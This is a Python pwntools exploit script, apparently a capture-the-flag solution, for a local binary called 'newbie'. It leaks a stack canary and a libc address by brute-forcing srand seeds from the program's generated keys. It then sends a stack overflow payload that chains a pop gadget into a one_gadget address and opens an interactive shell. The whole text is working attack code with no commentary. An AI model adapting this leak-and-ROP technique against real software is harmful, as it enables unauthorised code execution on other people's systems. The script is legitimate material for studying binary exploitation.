from pwn import *
from ctypes import CDLL
pty = process.PTY

p = process('./newbie', stdin=pty, stdout=pty)
libc = CDLL("libc.so.6")
e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
randarr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def bf_seed(sample):
    for i in range (0, 0xffff):
        libc.srand(i)
        data = ''
        for _ in range (0, 32):
            data += randarr[libc.rand() % 62]
        
        if data == sample:
            return i
            
def get_random(index):
	p.recvuntil(b'> ')
	payload1 = b'id ' + str(index).encode() + b'\x00'
	p.sendline(payload1)
	p.recvuntil(b'> ')
	p.sendline(b'create')
	p.recvuntil(b'Your key: ')
	random = p.recvline().strip().decode()
	return random

def leak_qword_at_offset(index):
	temp = ''
	r = get_random(index)
	temp = '{:04X}'.format(bf_seed(r)) + temp
	r = get_random(index + 1)
	temp = '{:04X}'.format(bf_seed(r)) + temp
	r = get_random(index + 2)
	temp = '{:04X}'.format(bf_seed(r)) + temp
	r = get_random(index + 3)
	temp = '{:04X}'.format(bf_seed(r)) + temp
	temp = '0x' + temp
	leak = int(temp, 16)
	return leak


canary = leak_qword_at_offset(49)
io_stdin = leak_qword_at_offset(25)
libc_base = io_stdin - e.symbols['_IO_2_1_stdout_']
log.info(hex(canary))
log.info(hex(libc_base))

pop_r12_ret = libc_base + 0x0000000000032b59;
one_gadget = libc_base + 0xe6c7e;

payload = b'quit' + b'A'*0x54
payload += p64(canary) + b'A'*0x8
payload += p64(pop_r12_ret) + p64(0) + p64(one_gadget)
p.recvuntil(b'> ')
p.sendline(payload)

p.interactive()
